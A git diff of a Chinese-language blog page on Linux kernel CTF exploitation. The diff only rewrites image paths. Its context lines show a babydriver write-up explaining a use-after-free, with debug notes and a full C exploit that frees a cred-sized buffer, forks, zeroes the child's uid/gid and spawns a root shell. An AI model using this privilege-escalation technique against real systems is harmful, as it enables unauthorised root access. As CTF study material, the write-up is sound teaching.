 <li>通过copy_from_user拷贝数据，因为是将rsi的数据拷贝到rdi，也就是将buffer里的数据拷贝到device_buf</li>
@@ -880,11 +880,11 @@
 <p>与write类似</p>
 </li>
 <li><p>release</p>
-<p><img src="/2021/06/05/kernel-study/image-20210605212036394.png" alt="image-20210605212036394"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605212036394.png" alt="image-20210605212036394"></p>
 <p>释放device_buf指向的chunk，但没有置零【UAF】</p>
 </li>
 <li><p>ioctl</p>
-<p><img src="/2021/06/05/kernel-study/image-20210605212140400.png" alt="image-20210605212140400"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605212140400.png" alt="image-20210605212140400"></p>
 <ol>
 <li>esi的值位0x10001</li>
 <li>释放device_buf</li>
@@ -899,7 +899,7 @@
 <blockquote>
 <p>注意，申请多个设备，对他们的操作应该是独立的，但是本题中由于将结果都赋值到一个全局变量中，导致多个设备之间底层使用的是同一个地址。</p>
 </blockquote>
-<p><img src="/2021/06/05/kernel-study/image-20210606152944747.png" alt="image-20210606152944747"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606152944747.png" alt="image-20210606152944747"></p>
 <p>由于程序将结果保存再一个全局变量中，故对两个设备的操作，本质上是对同一地址操作</p>
 <ul>
 <li>申请fd1，会申请一块空间，并赋值给了<code>babydev_struct.device_buf</code></li>
@@ -917,35 +917,35 @@
 <li><p>通过fd2修改内容，就是修改4中子进程的cred，则提权成功！</p>
 </li>
 </ol>
-<h5 id="调试信息-2"><a href="#调试信息-2" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/kernel-study/image-20210606140816472.png" alt="image-20210606140816472"></p>
+<h5 id="调试信息-2"><a href="#调试信息-2" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/20-29-undefined/image-20210606140816472.png" alt="image-20210606140816472"></p>
 <p>根据调试信息对比ida可以看出，0xffffffffc00024d0地址就是babydev_struct.device_buf</p>
 <blockquote>
 <p>尚未初始化的时候，值为0</p>
 </blockquote>
-<p><img src="/2021/06/05/kernel-study/image-20210606144728288.png" alt="image-20210606144728288"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606144728288.png" alt="image-20210606144728288"></p>
 <blockquote>
 <p>第一次申请设备</p>
 </blockquote>
-<p><img src="/2021/06/05/kernel-study/image-20210606144740804.png" alt="image-20210606144740804"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606144740804.png" alt="image-20210606144740804"></p>
 <blockquote>
 <p>第二次申请设备</p>
 </blockquote>
-<p><img src="/2021/06/05/kernel-study/image-20210606144750687.png" alt="image-20210606144750687"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606144750687.png" alt="image-20210606144750687"></p>
 <blockquote>
 <p>ioctl，修改设备1chunk的大小为cred_size</p>
 </blockquote>
-<p><img src="/2021/06/05/kernel-study/image-20210606144805046.png" alt="image-20210606144805046"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606144805046.png" alt="image-20210606144805046"></p>
 <blockquote>
 <p>释放设备1，此时设备2的device_buf将指向一块以释放内存</p>
 </blockquote>
-<p><img src="/2021/06/05/kernel-study/image-20210606144818089.png" alt="image-20210606144818089"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606144818089.png" alt="image-20210606144818089"></p>
 <blockquote>
 <p>cred结构体的前28个字节都被设置为0（包括uid、gid）</p>
 </blockquote>
-<p><img src="/2021/06/05/kernel-study/image-20210606144822285.png" alt="image-20210606144822285"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606144822285.png" alt="image-20210606144822285"></p>
 <h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//申请两个设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd1:%d\n"</span>,fd1);<span class="comment">//文件描述符3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd2:%d\n"</span>,fd2);<span class="comment">//文件描述符4</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xA8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放fd1，此时，LKMs2的device_buf将指向一块大小为sizeof(struct cred)的已free的内存</span></span><br><span class="line">    <span class="built_in">close</span>(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间将占用那一块已free的内存</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 篡改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">write</span>(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210606154209689.png" alt="image-20210606154209689"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210606154209689.png" alt="image-20210606154209689"></p>
 <h3 id="5-2020高校战疫分享赛-–-Kernoob"><a href="#5-2020高校战疫分享赛-–-Kernoob" class="headerlink" title="5.2020高校战疫分享赛 – Kernoob"></a>5.2020高校战疫分享赛 – Kernoob</h3><h4 id="下载文件-4"><a href="#下载文件-4" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="Kernoob.zip">附件</a>        <a href="https://adworld.xctf.org.cn/match/contest_challenge?event=134&hash=a94cbc83-14c0-4de3-85f8-55ef6ed4361c.event" target="_blank" rel="noopener">链接</a></p>
 <p>给了四个文件：bzImage、initramfs.cpio、noob.ko和startvm.sh</p>
 <h4 id="预备-2"><a href="#预备-2" class="headerlink" title="预备"></a>预备</h4><ol>
